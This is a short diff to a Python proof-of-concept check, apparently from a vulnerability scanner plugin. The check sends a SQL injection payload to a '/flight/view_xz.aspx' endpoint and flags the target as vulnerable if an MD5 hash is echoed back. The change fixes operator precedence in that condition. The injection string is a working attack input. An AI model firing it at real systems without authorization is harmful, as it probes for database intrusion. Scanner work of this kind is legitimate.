@@ -53,7 +53,7 @@ class Poc(ABPoc):
             url = arg + \
                 '/flight/view_xz.aspx?a=1+and+1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
             code, head, res, errcode, _ = hh.http(url)
-            if code == 500 or code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
+            if (code == 500 or code == 200) and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
